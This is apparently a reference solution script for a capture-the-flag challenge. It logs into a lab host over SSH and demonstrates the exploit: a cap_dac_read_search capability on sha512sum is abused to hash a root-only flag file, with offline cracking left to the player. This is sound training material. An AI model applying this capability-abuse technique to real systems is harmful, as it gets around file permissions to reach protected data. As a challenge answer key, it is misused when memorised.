#!/bin/bash
#
# Reference solution for 01-aw3som3-passw0rd.
#
# The flag file is readable only by root, but /usr/bin/sha512sum carries
# cap_dac_read_search, so the ctf user can hash it even though it cannot read
# it. This script logs in and demonstrates that primitive: `cat flag` is denied
# while `sha512sum flag` succeeds. Recovering the plaintext from the hash is the
# final, offline step (e.g. crackstation.net) and is left to the player.
#
# Host, port and password come from the environment (CTF_HOST, CTF_PORT,
# CTF_PASSWORD). Needs sshpass and an ssh client.
set -uo pipefail

host="${CTF_HOST:-localhost}"; port="${CTF_PORT:-22}"; password="${CTF_PASSWORD:-CTF_PASSWORD}"
run() {
    sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -p "$port" "ctf@$host" "$1"
}

denied=$(run "cd /home/ctf && cat flag 2>&1 1>/dev/null" || true)
hash=$(run "cd /home/ctf && /usr/bin/sha512sum flag" | awk '{print $1}')

echo "cat flag       -> ${denied:-<no error? unexpected>}"
echo "sha512sum flag -> $hash"
echo "crack this sha512 hash offline (e.g. crackstation.net) to recover the flag"

if echo "$denied" | grep -qi 'permission denied' && [[ "$hash" =~ ^[0-9a-f]{128}$ ]]; then
    echo "primitive verified: the capability hashes a file the account cannot read"
    exit 0
fi
echo "primitive check failed" >&2
exit 1
